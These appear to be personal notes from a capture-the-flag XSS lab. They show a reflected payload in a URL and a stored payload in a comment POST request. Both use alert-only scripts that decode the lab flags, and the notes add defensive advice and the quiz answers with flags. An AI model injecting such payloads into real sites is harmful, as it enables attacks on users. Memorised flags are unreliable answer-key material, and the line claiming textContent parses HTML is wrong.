# Reflected XSS
`https://trygiftme.thm/search?term=gift`

`https://trygiftme.thm/search?term=<script>alert( atob("VEhNe0V2aWxfQnVubnl9") )</script>`

-> Usually exploit via phishing 

# Stored XSS
save the payload inside the database and then someone will trigger it

### Malicious Comment Submission (Stored XSS Example)
```
POST /post/comment HTTP/1.1
Host: tgm.review-your-gifts.thm

postId=3
name=Tony Baritone
email=tony@normal-person-i-swear.net
comment=<script>alert(atob("VEhNe0V2aWxfU3RvcmVkX0VnZ30="))</script> + "This gift set my carpet on fire but my kid loved it!"
```

# Protecting against XSS

- Disable dangerous rendering raths: Instead of using the innerHTML property, which lets you inject any content directly into HTML, use the textContent property instead, it treats input as text and parses it for HTML.
- Make cookies inaccessible to JS: Set session cookies with the HttpOnly, Secure, and SameSite attributes to reduce the impact of XSS attacks.
- Sanitise input/output and encode:
  - In some situations, applications may need to accept limited HTML input—for example, to allow users to include safe links or basic formatting. However it's critical to sanitize and encode all user-supplied data to prevent security vulnerabilities. Sanitising and encoding removes or escapes any elements that could be interpreted as executable code, such as scripts, event handlers, or JavaScript URLs while preserving safe formatting.


Which type of XSS attack requires payloads to be persisted on the backend?

`stored`

What's the reflected XSS flag?

`THM{Evil_Bunny}`

What's the stored XSS flag?

`THM{Evil_Stored_Egg}`
